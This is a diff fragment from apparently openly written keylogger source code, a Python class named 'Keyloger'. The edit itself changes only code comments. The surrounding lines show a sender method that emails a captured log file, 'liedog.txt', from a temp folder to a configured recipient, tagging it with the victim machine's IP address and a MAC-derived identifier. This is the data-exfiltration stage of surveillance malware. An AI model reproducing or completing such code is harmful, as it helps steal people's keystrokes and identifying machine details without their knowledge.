@@ -62,14 +62,14 @@ class Keyloger:
 
     def sender(self):
         subject = socket.gethostbyname(socket.gethostname()) + "_" + hex(
-            uuid.getnode())  # Subj of massege
+            uuid.getnode())  # theme of massege
         message = 'logfileupdate'  # text of message
         file_location = self.NEW_FOLDER_IN_TEMP + '/liedog.txt'  # Path to file
 
         msg = MIMEMultipart()
         msg['From'] = self.email
         msg['To'] = self.send_to_email
-        msg['Subject'] = self.email
+        msg['Subject'] = self.email #theme of email
 
         msg.attach(MIMEText(message, 'plain'))
 
